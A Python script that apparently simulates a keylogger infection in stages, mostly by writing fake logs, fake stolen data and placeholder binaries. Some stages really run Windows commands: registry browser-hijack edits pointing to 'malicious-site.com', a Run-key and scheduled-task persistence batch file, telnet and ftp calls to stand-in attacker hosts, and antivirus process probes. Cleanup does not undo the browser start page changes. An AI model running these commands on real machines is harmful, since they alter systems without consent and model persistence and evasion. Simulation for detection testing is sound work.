import os
import time
import threading
import subprocess
import random
import string
from pathlib import Path

class KeyloggerSimulator:
    def __init__(self):
        self.temp_dir = Path.cwd() / "temp_keylogger"
        self.temp_dir.mkdir(exist_ok=True)
        self.running = False
        
    def simulate_keylogger_installation(self):
        print("Simulating keylogger installation...")
        
        keylogger_files = [
            "winlogon.exe", "svchost.exe", "explorer.exe", 
            "system32.dll", "kernel32.dll", "user32.dll"
        ]
        
        for filename in keylogger_files:
            try:
                fake_file = self.temp_dir / filename
                shutil.copy("C:\\Windows\\System32\\notepad.exe", fake_file)
                print(f"Installed: {filename}")
                time.sleep(0.5)
            except Exception:
                fake_file = self.temp_dir / filename
                fake_file.write_bytes(b"FAKE_KEYLOGGER_BINARY" * 100)
    
    def simulate_keystroke_capture(self):
        print("Simulating keystroke capture...")
        
        keylog_file = self.temp_dir / "keylog.dat"
        
        fake_keystrokes = [
            "[WINDOW: Banking Login]",
            "username: john.doe@email.com",
            "password: MySecretPass123!",
            "[WINDOW: Credit Card Form]",
            "card_number: 4532-1234-5678-9012",
            "cvv: 123",
            "expiry: 12/25",
            "[WINDOW: Social Media]",
            "status_update: Just logged into my bank account",
            "[WINDOW: Email Client]",
            "email_to: boss@company.com",
            "subject: Confidential Project Data",
            "body: Attached are the classified documents...",
        ]
        
        with open(keylog_file, 'w') as f:
            for keystroke in fake_keystrokes:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {keystroke}\n")
                time.sleep(0.1)
    
    def simulate_screen_capture(self):
        print("Simulating screen capture...")
        
        screenshots_dir = self.temp_dir / "screenshots"
        screenshots_dir.mkdir(exist_ok=True)
        
        for i in range(5):
            screenshot_file = screenshots_dir / f"screen_{i:03d}.jpg"
            fake_image_data = b"FAKE_SCREENSHOT_DATA" * 1000
            screenshot_file.write_bytes(fake_image_data)
            print(f"Captured screenshot: {screenshot_file.name}")
            time.sleep(1)
    
    def simulate_clipboard_monitoring(self):
        print("Simulating clipboard monitoring...")
        
        clipboard_file = self.temp_dir / "clipboard.log"
        
        fake_clipboard_data = [
            "Copied password: admin123",
            "Copied credit card: 4532123456789012",
            "Copied email: confidential@company.com",
            "Copied document: TOP_SECRET_PROJECT.docx",
            "Copied URL: https://banking.secure-site.com/login"
        ]
        
        with open(clipboard_file, 'w') as f:
            for data in fake_clipboard_data:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {data}\n")
                time.sleep(0.5)
    
    def simulate_browser_hijacking(self):
        print("Simulating browser hijacking...")
        
        try:
            hijack_commands = [
                'reg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v "Start Page" /t REG_SZ /d "http://malicious-site.com" /f',
                'reg add "HKCU\\Software\\Google\\Chrome\\PreferenceMACs\\Default\\homepage" /v "homepage" /t REG_SZ /d "http://phishing-site.com" /f'
            ]
            
            for cmd in hijack_commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True)
                    print("Browser settings modified")
                    time.sleep(1)
                except Exception:
                    pass
        except Exception as e:
            print(f"Browser hijacking failed: {e}")
    
    def simulate_network_communication(self):
        print("Simulating malicious network communication...")
        
        try:
            network_commands = [
                "nslookup malware-c2.darkweb.onion",
                "ping 192.168.1.100",
                "telnet suspicious-server.com 4444",
                "ftp anonymous@data-exfil.com"
            ]
            
            for cmd in network_commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True, timeout=3)
                    print(f"Network communication: {cmd}")
                    time.sleep(1)
                except Exception:
                    pass
        except Exception as e:
            print(f"Network communication failed: {e}")
    
    def simulate_data_theft(self):
        print("Simulating data theft...")
        
        stolen_data_dir = self.temp_dir / "stolen_data"
        stolen_data_dir.mkdir(exist_ok=True)
        
        sensitive_files = [
            ("passwords.txt", "admin:password123\nuser:mypass456\nroot:secret789"),
            ("credit_cards.csv", "Name,Number,CVV,Expiry\nJohn Doe,4532123456789012,123,12/25"),
            ("personal_info.json", '{"ssn":"123-45-6789","dob":"1990-01-01","address":"123 Main St"}'),
            ("browser_history.log", "https://banking.com\nhttps://paypal.com\nhttps://amazon.com"),
            ("email_contacts.txt", "boss@company.com\nclient@business.org\nfriend@personal.net")
        ]
        
        for filename, content in sensitive_files:
            stolen_file = stolen_data_dir / filename
            stolen_file.write_text(content)
            print(f"Stole: {filename}")
            time.sleep(0.5)
    
    def simulate_persistence_installation(self):
        print("Simulating persistence mechanisms...")
        
        try:
            persistence_script = self.temp_dir / "persistence.bat"
            persistence_content = """
@echo off
echo Keylogger persistence activated
copy "%~dp0winlogon.exe" "C:\\Windows\\Temp\\winlogon.exe"
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsLogon" /t REG_SZ /d "C:\\Windows\\Temp\\winlogon.exe" /f
schtasks /create /tn "SystemLogon" /tr "C:\\Windows\\Temp\\winlogon.exe" /sc onlogon /f
            """
            persistence_script.write_text(persistence_content)
            
            try:
                subprocess.run([str(persistence_script)], shell=True, capture_output=True)
                print("Persistence mechanisms installed")
            except Exception:
                pass
                
        except Exception as e:
            print(f"Persistence installation failed: {e}")
    
    def simulate_anti_detection(self):
        print("Simulating anti-detection techniques...")
        
        try:
            anti_detection_commands = [
                "tasklist | findstr /i antivirus",
                "tasklist | findstr /i defender",
                "tasklist | findstr /i malware",
                "sc query WinDefend",
                "wmic process where name='MsMpEng.exe' get ProcessId"
            ]
            
            for cmd in anti_detection_commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True, timeout=3)
                    print(f"Anti-detection scan: {cmd}")
                    time.sleep(1)
                except Exception:
                    pass
        except Exception as e:
            print(f"Anti-detection failed: {e}")
    
    def simulate_rootkit_behavior(self):
        print("Simulating rootkit behavior...")
        
        try:
            rootkit_files = ["ntoskrnl.exe", "hal.dll", "win32k.sys"]
            
            for filename in rootkit_files:
                fake_rootkit = self.temp_dir / filename
                fake_rootkit.write_bytes(b"FAKE_ROOTKIT_CODE" * 500)
                print(f"Rootkit component: {filename}")
                time.sleep(0.5)
            
            process_hiding_script = self.temp_dir / "hide_process.vbs"
            vbs_content = '''
Set objWMIService = GetObject("winmgmts:")
Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'winlogon.exe'")
For Each objProcess in colProcesses
    objProcess.SetPriority(128)
Next
            '''
            process_hiding_script.write_text(vbs_content)
            
        except Exception as e:
            print(f"Rootkit simulation failed: {e}")
    
    def run_full_keylogger_simulation(self):
        print("=== ADVANCED KEYLOGGER SIMULATION ===")
        
        simulation_stages = [
            ("Keylogger Installation", self.simulate_keylogger_installation),
            ("Keystroke Capture", self.simulate_keystroke_capture),
            ("Screen Capture", self.simulate_screen_capture),
            ("Clipboard Monitoring", self.simulate_clipboard_monitoring),
            ("Browser Hijacking", self.simulate_browser_hijacking),
            ("Network Communication", self.simulate_network_communication),
            ("Data Theft", self.simulate_data_theft),
            ("Persistence Installation", self.simulate_persistence_installation),
            ("Anti-Detection", self.simulate_anti_detection),
            ("Rootkit Behavior", self.simulate_rootkit_behavior)
        ]
        
        for stage_name, stage_func in simulation_stages:
            print(f"\n--- {stage_name} ---")
            try:
                stage_func()
            except Exception as e:
                print(f"Stage failed: {e}")
            time.sleep(1)
        
        print("\n=== KEYLOGGER SIMULATION COMPLETE ===")
    
    def cleanup(self):
        print("Cleaning up keylogger artifacts...")
        try:
            if self.temp_dir.exists():
                import shutil
                shutil.rmtree(self.temp_dir)
            
            cleanup_commands = [
                'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsLogon" /f',
                'schtasks /delete /tn "SystemLogon" /f',
                'del /f /q "C:\\Windows\\Temp\\winlogon.exe"'
            ]
            
            for cmd in cleanup_commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True)
                except Exception:
                    pass
                    
        except Exception as e:
            print(f"Cleanup failed: {e}")

if __name__ == "__main__":
    import sys
    import shutil
    
    simulator = KeyloggerSimulator()
    
    try:
        if len(sys.argv) > 1 and sys.argv[1] == "--full":
            simulator.run_full_keylogger_simulation()
        else:
            print("=== QUICK KEYLOGGER TEST ===")
            simulator.simulate_keylogger_installation()
            simulator.simulate_keystroke_capture()
            simulator.simulate_data_theft()
    finally:
        time.sleep(3)
        simulator.cleanup()